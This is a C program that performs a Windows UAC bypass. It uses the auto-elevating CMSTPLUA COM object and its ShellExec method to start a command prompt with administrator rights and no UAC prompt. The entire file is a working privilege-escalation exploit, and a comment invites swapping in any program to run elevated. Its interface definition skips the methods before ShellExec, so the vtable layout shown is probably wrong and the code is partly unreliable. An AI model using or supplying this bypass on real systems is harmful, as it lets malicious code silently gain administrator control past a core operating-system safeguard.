#include <windows.h>
#include <objbase.h>
#include <stdio.h>

// ICMLuaUtil interface definition
typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT(STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil *This, REFIID riid, void **ppvObject);
    ULONG(STDMETHODCALLTYPE *AddRef)(ICMLuaUtil *This);
    ULONG(STDMETHODCALLTYPE *Release)(ICMLuaUtil *This);
    // ... other methods skipped for brevity
    HRESULT(STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil *This, LPCWSTR lpFile, LPCWSTR lpParameters,
                                          LPCWSTR lpDirectory, ULONG fMask, ULONG nShow);
    END_INTERFACE
} ICMLuaUtilVtbl;

typedef struct ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl *lpVtbl;
} ICMLuaUtil;

// GUIDs
const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, {0x90,0x63,0xA1,0x20,0x24,0x4F,0xBE,0xC7} };
const IID IID_ICMLuaUtil   = { 0x6EDD6D74, 0xC007, 0x4E75, {0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4C} };

int main() {
    HRESULT hr;
    ICMLuaUtil *pLuaUtil = NULL;
    BIND_OPTS3 bo;

    CoInitialize(NULL);

    ZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;

    // Use Elevation Moniker for auto-elevate (no UAC prompt)
    hr = CoGetObject(L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}",
                     (BIND_OPTS*)&bo, &IID_ICMLuaUtil, (void**)&pLuaUtil);

    if (SUCCEEDED(hr) && pLuaUtil) {
        // Change this to whatever you want to run elevated
        pLuaUtil->lpVtbl->ShellExec(pLuaUtil,
                                    L"C:\\Windows\\System32\\cmd.exe",
                                    L"/k whoami && pause",  // example: shows elevated whoami
                                    NULL,
                                    SEE_MASK_DEFAULT,
                                    SW_SHOW);

        pLuaUtil->lpVtbl->Release(pLuaUtil);
        printf("[+] Success: Elevated process launched via CMSTPLUA.\n");
    } else {
        printf("[-] Failed: 0x%08X\n", hr);
    }

    CoUninitialize();
    return 0;
}
